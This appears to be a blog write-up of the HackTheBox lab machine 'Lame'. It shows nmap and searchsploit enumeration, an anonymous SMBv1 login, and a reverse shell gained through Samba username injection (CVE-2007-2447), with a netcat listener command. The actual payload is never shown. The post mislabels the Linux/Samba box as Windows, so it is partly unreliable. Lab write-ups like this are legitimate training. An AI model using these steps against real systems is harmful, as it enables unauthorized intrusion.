I've just completed Lame from HTB! In my opinion, Lame is an easy box that provides a quick introduction to the Windows Operating System. Here is a quick writeup about how I solved this box. 

<!--more-->

## HTB - Lame
**Box** : Lame\
**IP Address** : 10.10.10.3\
**Operating System** : Windows

## Remarks

- While doing this box, I failed to realize that `Samba` has actually turned off SMBv1 support. Hence, I was met with a lot of connection errors when I attempted to pwn the box (And a lot of hair-tearing sessions!!)

## Enumeration
As with any other box, let's do a quick Nmap scan to identify the possible open ports. For this box, there is slight more open ports, 5 in fact - namely ports `21`, `22`, `139`, `445` and `3632`.

Port `21` belongs to an FTP server, port `22` belongs to an SSH server, port `3632` belongs to a distccd server while ports `139` and `445` belong to a netbios-ssn server. Both ports `139` and `445` uses Samba, but the main difference is the version of Samba used.

Firstly, we do a `searchsploit` for existing vulnerability to Port `21`, and we discovered that `vsftpd 2.3.4` running on Port `21` may be vulnearble to backdoor command execution. 

```bash
------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remot | linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote D | windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote D | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service           | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution  | unix/remote/17491.rb
vsftpd 2.3.4 - Backdoor Command Execution  | unix/remote/49757.py
vsftpd 3.0.3 - Remote Denial of Service    | multiple/remote/49719.py
------------------------------------------- ---------------------------------

```

To verify this, we will scan for the vulnerability using Nmap. Sadly, this port doesn't seem to be vulnerable to such a backdoor exploitation.

## Exploitation

Noticing that Ports `139` and `445` uses Samba and also knowing that Samba is a SMB networking protocol. We will now try to connect to the SMB server using the SMBv1 protocol, reason being that SMBv1 has more vulnerabilities and attack vectors for us to try. One thing to note though is that Samba has actually turned off its SMBv1 support, so we would have to supply `client min protocol=NT1` argument for it to work. At the same time, we also realize that we could log in to the server anonymously. 

```bash
┌──(kali㉿kali)-[~]
└─$ smbclient -L 10.10.10.3 --option='client min protocol=NT1'
Enter WORKGROUP\kali's password: 
Anonymous login successful

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAME
```

Knowing that we can login to the Samba server without any credentials, we also found `CVE 2007-2447` exploit from `exploitdb` that allows the username parameter to be injected to run command in the SMB server. This could then be used to create a reverse shell to the attacker's machine. 

To do so, we will first have to create a listener on the attacker's machine
```bash
nc -nlvp 3000
```

Afterwards, all we have to do is to connect to the SMB client and send the metacharacters into the username with the reverse shell payload
```bash
┌──(kali㉿kali)-[~]
└─$ smbclient //10.10.10.3/tmp                                           1 ⚙
Enter WORKGROUP\kali's password: 
Anonymous login successful

Password:

smb: \>
```

### Obtaining the system flag

Afterwards a connection will be received on the attacker's machine. All we that is left to do is to stabilize the shell and obtain the system flag.

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nlvp 3000              
listening on [any] 3000 ...
